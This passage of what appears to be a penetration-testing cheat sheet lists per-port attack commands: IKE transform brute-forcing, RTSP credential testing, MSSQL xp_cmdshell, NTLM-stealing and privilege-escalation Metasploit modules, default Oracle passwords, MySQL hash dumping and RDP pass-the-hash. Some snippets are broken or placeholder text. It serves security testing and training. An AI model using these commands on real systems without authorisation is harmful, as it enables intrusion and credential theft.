+nmap -sV --script=ssl-heartbleed $IP
+</code></pre></div><h3 id=port-500----isakmp-ipsecike-vpn>Port 500 - ISAKMP IPsec/IKE VPN
+<a class=heading-link href=#port-500----isakmp-ipsecike-vpn><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># enumeration</span>
+nmap -sU -p <span style=color:#ff0;font-weight:700>500</span>
+
+ike-scan $IP
+ike-scan -M $IP
+
+</code></pre></div><p>As you can see in the previous response, there is a field called AUTH with the value PSK.
+This means that the vpn is configured using a preshared key (and this is really good for a pentester).</p><ul><li>The value of the last line is also very important: *</li><li>0 returned handshake; 0 returned notify: This means the target is not an IPsec gateway.</li><li>1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output)</li><li>0 returned handshake; 1 returned notify: VPN gateways respond with a notify message when none of the transforms are acceptable (though some gateways do not, in which case further analysis and a revised proposal should be tried).
+Then, in this case we already have a valid transformation but if you are in the 3rd case, then you need to brute-force a little bit to find a valid transformation:
+First of all you need to create all the possible transformations:</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#fff;font-weight:700>for</span> ENC in <span style=color:#ff0;font-weight:700>1</span> <span style=color:#ff0;font-weight:700>2</span> <span style=color:#ff0;font-weight:700>3</span> <span style=color:#ff0;font-weight:700>4</span> <span style=color:#ff0;font-weight:700>5</span> <span style=color:#ff0;font-weight:700>6</span> 7/128 7/192 7/256 8; <span style=color:#fff;font-weight:700>do</span> <span style=color:#fff;font-weight:700>for</span> HASH in <span style=color:#ff0;font-weight:700>1</span> <span style=color:#ff0;font-weight:700>2</span> <span style=color:#ff0;font-weight:700>3</span> <span style=color:#ff0;font-weight:700>4</span> <span style=color:#ff0;font-weight:700>5</span> 6; <span style=color:#fff;font-weight:700>do</span> <span style=color:#fff;font-weight:700>for</span> AUTH in <span style=color:#ff0;font-weight:700>1</span> <span style=color:#ff0;font-weight:700>2</span> <span style=color:#ff0;font-weight:700>3</span> <span style=color:#ff0;font-weight:700>4</span> <span style=color:#ff0;font-weight:700>5</span> <span style=color:#ff0;font-weight:700>6</span> <span style=color:#ff0;font-weight:700>7</span> <span style=color:#ff0;font-weight:700>8</span> <span style=color:#ff0;font-weight:700>64221</span> <span style=color:#ff0;font-weight:700>64222</span> <span style=color:#ff0;font-weight:700>64223</span> <span style=color:#ff0;font-weight:700>64224</span> <span style=color:#ff0;font-weight:700>65001</span> <span style=color:#ff0;font-weight:700>65002</span> <span style=color:#ff0;font-weight:700>65003</span> <span style=color:#ff0;font-weight:700>65004</span> <span style=color:#ff0;font-weight:700>65005</span> <span style=color:#ff0;font-weight:700>65006</span> <span style=color:#ff0;font-weight:700>65007</span> <span style=color:#ff0;font-weight:700>65008</span> <span style=color:#ff0;font-weight:700>65009</span> 65010; <span style=color:#fff;font-weight:700>do</span> <span style=color:#fff;font-weight:700>for</span> GROUP in <span style=color:#ff0;font-weight:700>1</span> <span style=color:#ff0;font-weight:700>2</span> <span style=color:#ff0;font-weight:700>3</span> <span style=color:#ff0;font-weight:700>4</span> <span style=color:#ff0;font-weight:700>5</span> <span style=color:#ff0;font-weight:700>6</span> <span style=color:#ff0;font-weight:700>7</span> <span style=color:#ff0;font-weight:700>8</span> <span style=color:#ff0;font-weight:700>9</span> <span style=color:#ff0;font-weight:700>10</span> <span style=color:#ff0;font-weight:700>11</span> <span style=color:#ff0;font-weight:700>12</span> <span style=color:#ff0;font-weight:700>13</span> <span style=color:#ff0;font-weight:700>14</span> <span style=color:#ff0;font-weight:700>15</span> <span style=color:#ff0;font-weight:700>16</span> <span style=color:#ff0;font-weight:700>17</span> 18; <span style=color:#fff;font-weight:700>do</span> <span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;--trans=</span>$ENC<span style=color:#0ff;font-weight:700>,</span>$HASH<span style=color:#0ff;font-weight:700>,</span>$AUTH<span style=color:#0ff;font-weight:700>,</span>$GROUP<span style=color:#0ff;font-weight:700>&#34;</span> &gt;&gt; ike-dict.txt ;<span style=color:#fff;font-weight:700>done</span> ;<span style=color:#fff;font-weight:700>done</span> ;<span style=color:#fff;font-weight:700>done</span> ;<span style=color:#fff;font-weight:700>done</span>
+</code></pre></div><p>And then brute-force each one using ike-scan (this can take several minutes):</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#fff;font-weight:700>while</span> <span style=color:#fff;font-weight:700>read</span> line; <span style=color:#fff;font-weight:700>do</span> (<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;Valid trans found: </span>$line<span style=color:#0ff;font-weight:700>&#34;</span> &amp;&amp; ike-scan -M $line &lt;IP&gt;) | grep -B14 <span style=color:#0ff;font-weight:700>&#34;1 returned handshake&#34;</span> | grep <span style=color:#0ff;font-weight:700>&#34;Valid trans found&#34;</span> ; <span style=color:#fff;font-weight:700>done</span> &lt; ike-dict.txt
+</code></pre></div><ul><li>Reference Material</li></ul><p><a href=www.ernw.de/download/pskattack.pdf%E2%80%8B>PSK cracking paper​</a>
+​<a href=www.securityfocus.com/infocus/1821>SecurityFocus Infocus​</a>
+​<a href=http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf>Scanning a VPN Implementation​</a></p><h3 id=port-502---modbus>Port 502 - Modbus
+<a class=heading-link href=#port-502---modbus><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap --script modbus-discover -p <span style=color:#ff0;font-weight:700>502</span> $IP
+msf&gt; use auxiliary/scanner/scada/modbusdetect
+msf&gt; use auxiliary/scanner/scada/modbus_findunitid
+
+</code></pre></div><h3 id=port-512---rexec>Port 512 - Rexec
+<a class=heading-link href=#port-512---rexec><i class="fa fa-link" aria-hidden=true></i></a></h3><p>\x90</p><h3 id=port-513---rlogin>Port 513 - Rlogin
+<a class=heading-link href=#port-513---rlogin><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># login</span>
+apt install rsh-client
+rlogin -l &lt;USER&gt; $IP
+
+</code></pre></div><h3 id=port-514---rsh>Port 514 - RSH
+<a class=heading-link href=#port-514---rsh><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Login</span>
+rsh $IP &lt;Command&gt;
+rsh $IP -l domain<span style=color:#0ff;font-weight:700>\u</span>ser &lt;Command&gt;
+rsh domain/user@$IP &lt;Command&gt;
+rsh domain<span style=color:#0ff;font-weight:700>\\</span>user@$IP &lt;Command&gt;
+
+</code></pre></div><h3 id=port-515---line-printerdaemon-lpd>Port 515 - line printerdaemon LPd
+<a class=heading-link href=#port-515---line-printerdaemon-lpd><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># The lpdprint tool included in PRET is a minimalist way to print data directly to an LPD capable printer as shown below:</span>
+lpdprint.py hostname filename
+</code></pre></div><p>If you want to learn more about <a href=https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856>hacking printers read this page.</a></p><h3 id=541---fortinet-sslvpn>541 - FortiNet SSLVPN
+<a class=heading-link href=#541---fortinet-sslvpn><i class="fa fa-link" aria-hidden=true></i></a></h3><p><code>\x90</code>
+### Port 548 - Apple Filing Protocol (AFP)</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># enumeration</span>
+msf&gt; use auxiliary/scanner/afp/afp_server_info
+nmap -sV --script <span style=color:#0ff;font-weight:700>&#34;afp-* and not dos and not brute&#34;</span> -p &lt;PORT&gt; $IP
+
+</code></pre></div><h3 id=port-554---rtsp>Port 554 - RTSP
+<a class=heading-link href=#port-554---rtsp><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Web interface, transfer images, streaming
+To formulate a Basic authentication element,
+one simple has to base 64 encode “:” and add it to the request.
+So a new request would look like:</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>DESCRIBE rtsp://&lt;ip&gt;:&lt;port&gt; RTSP/1.0<span style=color:#0ff;font-weight:700>\r\n</span>CSeq: 2<span style=color:#0ff;font-weight:700>\r\n</span>Authorization: Basic YWRtaW46MTIzNA==<span style=color:#0ff;font-weight:700>\r\n\r\n</span>
+</code></pre></div><p>Again note the request is terminated with the double “\r\n”.
+The value YWRtaW46MTIzNA== is the base 64 encoded username and password concatenated with “:”.
+In this case I have used “admin”/”1234”.
+Some simple python scripting to try this out looks like:</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#fff;font-weight:700>import</span> socket
+req = <span style=color:#0ff;font-weight:700>&#34;DESCRIBE rtsp://&lt;ip&gt;:&lt;port&gt; RTSP/1.0</span><span style=color:#0ff;font-weight:700>\r\n</span><span style=color:#0ff;font-weight:700>CSeq: 2</span><span style=color:#0ff;font-weight:700>\r\n</span><span style=color:#0ff;font-weight:700>Authorization: Basic YWRtaW46MTIzNA==</span><span style=color:#0ff;font-weight:700>\r\n\r\n</span><span style=color:#0ff;font-weight:700>&#34;</span>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((<span style=color:#0ff;font-weight:700>&#34;192.168.1.1&#34;</span>, <span style=color:#ff0;font-weight:700>554</span>))
+s.sendall(req)
+data = s.recv
+<span style=color:#fff;font-weight:700>print</span> data
+<span style=color:#007f7f># Voila! You have access.</span>
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># enumeration</span>
+nmap -sV --scripts <span style=color:#0ff;font-weight:700>&#34;rtsp-*&#34;</span> -p <span style=color:#ff0;font-weight:700>554</span> $IP
+
+</code></pre></div><blockquote><p>To bruteforce:
+<a href=https://github.com/Tek-Security-Group/rtsp_authgrinder>https://github.com/Tek-Security-Group/rtsp_authgrinder</a></p></blockquote><h3 id=port-623--udp--tcp---ipmi>Port 623 / UDP / TCP - IPMI
+<a class=heading-link href=#port-623--udp--tcp---ipmi><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -n -p <span style=color:#ff0;font-weight:700>623</span> 10.0.0./24
+nmap -n-sU -p <span style=color:#ff0;font-weight:700>623</span> 10.0.0./24
+msf &gt; use  auxiliary/scanner/ipmi/ipmi_version
+
+<span style=color:#007f7f># version</span>
+msf &gt; use auxiliary/scanner/ipmi/ipmi_version
+
+</code></pre></div><h3 id=port-631---internet-printing-protocolipp>Port 631 - Internet Printing Protocol(IPP)
+<a class=heading-link href=#port-631---internet-printing-protocolipp><i class="fa fa-link" aria-hidden=true></i></a></h3><blockquote><p>The Internet Printing Protocol (IPP) is defined in RFC2910 and RFC2911. It&rsquo;s an extendable protocol, for example ‘IPP Everywhere’ is a candidate for a standard in mobile and cloud printing and IPP extensions for 3D printing have been released.
+Because IPP is based on HTTP, it inherits all existing security features like basic/digest authentication and SSL/TLS encryption. To submit a print job or to retrieve status information from the printer, an HTTP POST request is sent to the IPP server listening on port 631/tcp. A famous open-source IPP implementation is CUPS,
+which is the default printing system in many Linux distributions and OS X. Similar to LPD,
+IPP is a channel to deploy the actual data to be printed and can be abused as a carrier for malicious PostScript or PJL files.</p></blockquote><h3 id=port-873---rsync>Port 873 - Rsync
+<a class=heading-link href=#port-873---rsync><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nc -vn 127.0.0.1 <span style=color:#ff0;font-weight:700>873</span>
+(UNKNOWN) [127.0.0.1] <span style=color:#ff0;font-weight:700>873</span> (rsync) open
+@RSYNCD: 31.0        &lt;--- You receive this banner with the version from the server
+@RSYNCD: 31.0        &lt;--- Then you send the same info
+<span style=color:#007f7f># list                &lt;--- Then you ask the sever to list</span>
+raidroot             &lt;--- The server starts enumerating
+USBCopy
+NAS_Public
+_NAS_Recycle_TOSRAID    &lt;--- Enumeration finished
+@RSYNCD: EXIT         &lt;--- Sever closes the connection
+
+nmap -sV --script <span style=color:#0ff;font-weight:700>&#34;rsync-list-modules&#34;</span> -p <span style=color:#ff0;font-weight:700>873</span> $IP
+msf&gt; use auxiliary/scanner/rsync/modules_list
+
+<span style=color:#007f7f>#Example using IPv6 and a different port</span>
+rsync -av --list-only rsync://[$IP-V6]:8730
+
+<span style=color:#007f7f># manual</span>
+rsync -av --list-only rsync://$IP/shared_name
+
+</code></pre></div><h3 id=port-1026---rusersd>Port 1026 - Rusersd
+<a class=heading-link href=#port-1026---rusersd><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+apt-get install rusers
+rusers -l $IP
+Sending broadcast <span style=color:#fff;font-weight:700>for</span> rusersd protocol version 3...
+Sending broadcast <span style=color:#fff;font-weight:700>for</span> rusersd protocol version 2...
+tiff       potatohead:console         Sep  <span style=color:#ff0;font-weight:700>2</span> 13:03   22:03
+katykat    potatohead:ttyp5           Sep  <span style=color:#ff0;font-weight:700>1</span> 09:35      <span style=color:#ff0;font-weight:700>14</span>
+
+</code></pre></div><h3 id=port-1028--1099---java-rmi>Port 1028 / 1099 - Java RMI
+<a class=heading-link href=#port-1028--1099---java-rmi><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+
+<span style=color:#007f7f># Basically this service could allow you to execute code.</span>
+msf &gt; use auxiliary/scanner/misc/java_rmi_server
+msf &gt; use auxiliary/gather/java_rmi_registry
+nmap -sV --script <span style=color:#0ff;font-weight:700>&#34;rmi-dumpregistry or rmi-vuln-classloader&#34;</span> -p <span style=color:#ff0;font-weight:700>1028</span> $IP
+
+<span style=color:#007f7f># Reverse Shell</span>
+msf &gt; use exploit/multi/browser/java_rmi_connection_impl
+
+</code></pre></div><h3 id=port-1030103210331038>Port 1030/1032/1033/1038
+<a class=heading-link href=#port-1030103210331038><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Used by RPC to connect in domain network.</li></ul><h3 id=mssql---1433>MSSQL - 1433
+<a class=heading-link href=#mssql---1433><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># info</span>
+
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p <span style=color:#ff0;font-weight:700>1433</span> &lt;IP&gt;
+msf&gt; use auxiliary/scanner/mssql/mssql_ping
+
+nmap -p <span style=color:#ff0;font-weight:700>1433</span> -sU --script=ms-sql-info.nse $IP
+sqsh -S $IP -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
+<span style=color:#007f7f># OR</span>
+sqsh -S $IP -U sa
+    xp_cmdshell <span style=color:#0ff;font-weight:700>&#39;date&#39;</span>
+    go
+
+<span style=color:#007f7f>#msfconsole</span>
+
+<span style=color:#007f7f>#Set USERNAME, RHOSTS and PASSWORD</span>
+<span style=color:#007f7f>#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used</span>
+
+<span style=color:#007f7f>#Steal NTLM</span>
+msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer <span style=color:#007f7f>#Steal NTLM hash, before executing run Responder</span>
+
+<span style=color:#007f7f>#Info gathering</span>
+msf&gt; use admin/mssql/mssql_enum <span style=color:#007f7f>#Security checks</span>
+msf&gt; use admin/mssql/mssql_enum_domain_accounts
+msf&gt; use admin/mssql/mssql_enum_sql_logins
+msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata
+msf&gt; use auxiliary/scanner/mssql/mssql_hashdump
+msf&gt; use auxiliary/scanner/mssql/mssql_schemadump
+
+<span style=color:#007f7f>#Search for insteresting data</span>
+msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata
+msf&gt; use auxiliary/admin/mssql/mssql_idf
+
+<span style=color:#007f7f>#Privesc</span>
+msf&gt; use exploit/windows/mssql/mssql_linkcrawler
+msf&gt; use admin/mssql/mssql_escalate_execute_as <span style=color:#007f7f>#If the user has IMPERSONATION privilege, this will try to escalate</span>
+msf&gt; use admin/mssql/mssql_escalate_dbowner <span style=color:#007f7f>#Escalate from db_owner to sysadmin</span>
+
+<span style=color:#007f7f>#Code execution</span>
+msf&gt; use admin/mssql/mssql_exec <span style=color:#007f7f>#Execute commands</span>
+msf&gt; use exploit/windows/mssql/mssql_payload <span style=color:#007f7f>#Uploads and execute a payload</span>
+
+<span style=color:#007f7f>#Add new admin user from meterpreter session</span>
+msf&gt; use windows/manage/mssql_local_auth_bypass
+
+</code></pre></div><h3 id=port-1521---oracle>Port 1521 - Oracle
+<a class=heading-link href=#port-1521---oracle><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>oscanner -s $IP -P <span style=color:#ff0;font-weight:700>1521</span>
+tnscmd10g version -h $IP
+tnscmd10g status -h $IP
+nmap -p <span style=color:#ff0;font-weight:700>1521</span> -A $IP
+nmap -p <span style=color:#ff0;font-weight:700>1521</span> --script=oracle-tns-version,oracle-sid-brute,oracle-brute
+<span style=color:#007f7f>#MSF</span>
+use auxiliary/admin/oracle
+use auxiliary/scanner/oracle
+</code></pre></div><h3 id=port-1723---pptp>Port 1723 - PPTP
+<a class=heading-link href=#port-1723---pptp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap –Pn -sSV -p1723 $IP
+
+</code></pre></div><h3 id=port-1883---mqtt-mosquitto>Port 1883 - MQTT (Mosquitto)
+<a class=heading-link href=#port-1883---mqtt-mosquitto><i class="fa fa-link" aria-hidden=true></i></a></h3><p>To connect to a MQTT service you can use: <a href=https://github.com/bapowell/python-mqtt-client-shell>https://github.com/bapowell/python-mqtt-client-shell</a></p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>&gt; connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
+&gt; subscribe <span style=color:#0ff;font-weight:700>&#34;#&#34;</span> <span style=color:#ff0;font-weight:700>1</span>
+&gt; subscribe <span style=color:#0ff;font-weight:700>&#34;</span>$SYS<span style=color:#0ff;font-weight:700>/#&#34;</span>
+
+</code></pre></div><p>Or you could run this code to try to connect to a MQTT service without authentication, subscribe to every topic and listen them:</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#007f7f>#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py</span>
+<span style=color:#fff;font-weight:700>import</span> paho.mqtt.client <span style=color:#fff;font-weight:700>as</span> mqtt
+<span style=color:#fff;font-weight:700>import</span> time
+<span style=color:#fff;font-weight:700>import</span> os
+
+HOST = <span style=color:#0ff;font-weight:700>&#34;127.0.0.1&#34;</span>
+PORT = <span style=color:#ff0;font-weight:700>1883</span>
+
+<span style=color:#fff;font-weight:700>def</span> on_connect(client, userdata, flags, rc):
+    client.subscribe(<span style=color:#0ff;font-weight:700>&#39;#&#39;</span>, qos=<span style=color:#ff0;font-weight:700>1</span>)
+    client.subscribe(<span style=color:#0ff;font-weight:700>&#39;$SYS/#&#39;</span>)
+
+<span style=color:#fff;font-weight:700>def</span> on_message(client, userdata, message):
+    <span style=color:#fff;font-weight:700>print</span>(<span style=color:#0ff;font-weight:700>&#39;Topic: </span><span style=color:#0ff;font-weight:700>%s</span><span style=color:#0ff;font-weight:700> | QOS: </span><span style=color:#0ff;font-weight:700>%s</span><span style=color:#0ff;font-weight:700>  | Message: </span><span style=color:#0ff;font-weight:700>%s</span><span style=color:#0ff;font-weight:700>&#39;</span> % (message.topic, message.qos, message.payload))
+
+<span style=color:#fff;font-weight:700>def</span> main():
+    client = mqtt.Client()
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.connect(HOST, PORT)
+    client.loop_start()
+    <span style=color:#007f7f>#time.sleep(10)</span>
+    <span style=color:#007f7f>#client.loop_stop()</span>
+
+<span style=color:#fff;font-weight:700>if</span> __name__ == <span style=color:#0ff;font-weight:700>&#34;__main__&#34;</span>:
+    main()
+
+</code></pre></div><h3 id=port-2049---nfs-tns-listener>Port 2049 - NFS TNS Listener
+<a class=heading-link href=#port-2049---nfs-tns-listener><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># enumeration</span>
+<span style=color:#007f7f># nmap scripts</span>
+nfs-ls <span style=color:#007f7f>#List NFS exports and check permissions</span>
+nfs-showmount <span style=color:#007f7f>#Like showmount -e</span>
+nfs-statfs <span style=color:#007f7f>#Disk statistics and info from NFS share</span>
+
+<span style=color:#007f7f># msf modul</span>
+scanner/nfs/nfsmount <span style=color:#007f7f>#Scan NFS mounts and list permissions</span>
+
+<span style=color:#007f7f># Mounting</span>
+showmount -e $IP
+mount -t nfs [-o vers=2] $IP:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock
+
+</code></pre></div><h3 id=port-2100---oracle-xml-db>Port 2100 - Oracle XML DB
+<a class=heading-link href=#port-2100---oracle-xml-db><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f>#FTP</span>
+    sys:sys
+    scott:tiger
+</code></pre></div><ul><li>list of passwords :
+<a href=https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm>https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</a></li></ul><h3 id=port-3260---iscsi>Port 3260 - ISCSI
+<a class=heading-link href=#port-3260---iscsi><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV --script=iscsi-info -p <span style=color:#ff0;font-weight:700>3260</span> $IP
+
+<span style=color:#007f7f># Manual enumeration</span>
+sudo apt-get install open-iscsi
+iscsiadm -m discovery -t sendtargets -p $IP:3260
+123.123.123.123:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
+[2a01:211:7b7:1223:211:32ff:fea9:fab9]:3260,1 iqn.2000-01.com.synology:asd3.Target-1.d0280fd382
+[fe80::211:3232:fab9:1223]:3260,1 iqn.2000-01.com.synology:Oassdx.Target-1.d0280fd382
+
+<span style=color:#007f7f># Then you catch the 2nd part of the printed string of each line</span>
+iscsiadm -m node --targetname=<span style=color:#0ff;font-weight:700>&#34;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&#34;</span> -p 123.123.123.123:3260 --login
+Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] (multiple)
+Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.
+
+<span style=color:#007f7f># logout</span>
+iscsiadm -m node --targetname=<span style=color:#0ff;font-weight:700>&#34;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&#34;</span> -p 123.123.123.123:3260 --logout
+
+</code></pre></div><h3 id=port-3299---saprouter>Port 3299 - SAPRouter
+<a class=heading-link href=#port-3299---saprouter><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Copy of: <a href=https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/>https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/</a></p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf&gt; use auxiliary/scanner/sap/sap_service_discovery
+msf auxiliary(sap_service_discovery) &gt; <span style=color:#fff;font-weight:700>set</span> RHOSTS $IP
+RHOSTS =&gt; $IP
+msf auxiliary(sap_service_discovery) &gt; run
+
+[*] [SAP] Beginning service Discovery <span style=color:#0ff;font-weight:700>&#39;1.2.3.101&#39;</span>
+
+[+] 1.2.3.101:3299      - SAP Router OPEN
+[*] Scanned <span style=color:#ff0;font-weight:700>1</span> of <span style=color:#ff0;font-weight:700>1</span> hosts (100% <span style=color:#fff;font-weight:700>complete</span>)
+[*] Auxiliary module execution completed
+
+msf &gt; use auxiliary/scanner/sap/sap_router_info_request
+
+</code></pre></div><h3 id=mysql---3306>MySQL - 3306
+<a class=heading-link href=#mysql---3306><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV -p <span style=color:#ff0;font-weight:700>3306</span> --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
+msf&gt; use auxiliary/scanner/mysql/mysql_version
+msf&gt; use uxiliary/scanner/mysql/mysql_authbypass_hashdump
+msf&gt; use auxiliary/scanner/mysql/mysql_hashdump <span style=color:#007f7f>#Creds</span>
+msf&gt; use auxiliary/admin/mysql/mysql_enum <span style=color:#007f7f>#Creds</span>
+msf&gt; use auxiliary/scanner/mysql/mysql_schemadump <span style=color:#007f7f>#Creds</span>
+msf&gt; use exploit/windows/mysql/mysql_start_up <span style=color:#007f7f>#Execute commands Windows, Creds</span>
+
+<span style=color:#007f7f># Connect Remote</span>
+mysql -h &lt;Hostname&gt; -u root
+mysql -h &lt;Hostname&gt; -u root@localhost
+
+</code></pre></div><h3 id=port-3339---oracle-web-interface>Port 3339 - Oracle web interface
+<a class=heading-link href=#port-3339---oracle-web-interface><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Basic info about web service (apache, nginx, IIS)</p><h3 id=port-3389---rdp>Port 3389 - RDP
+<a class=heading-link href=#port-3389---rdp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># enum</span>
+nmap -p <span style=color:#ff0;font-weight:700>3389</span> --script=rdp-vuln-ms12-020.nse $IP
+nmap --script <span style=color:#0ff;font-weight:700>&#34;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&#34;</span> -p <span style=color:#ff0;font-weight:700>3389</span> -T4 &lt;IP&gt;
+
+<span style=color:#007f7f># Connect with known credetials/hash</span>
+rdesktop -u &lt;username&gt; $IP
+rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; $IP
+xfreerdp /u:[domain<span style=color:#0ff;font-weight:700>\]</span>&lt;username&gt; /p:&lt;password&gt; /v:$IPP
+xfreerdp /u:[domain<span style=color:#0ff;font-weight:700>\]</span>&lt;username&gt; /pth:&lt;hash&gt; /v:$IP
+
+<span style=color:#007f7f># Check known credentials</span>
+rdp_check &lt;domain&gt;<span style=color:#0ff;font-weight:700>\&lt;</span>name&gt;:&lt;password&gt;@$IP
+
+[Post-Exploitation](https://github.com/JoelGMSec/AutoRDPwn)
+
+<span style=color:#007f7f># Launch CMD with other cretentials so they are used in the network</span>
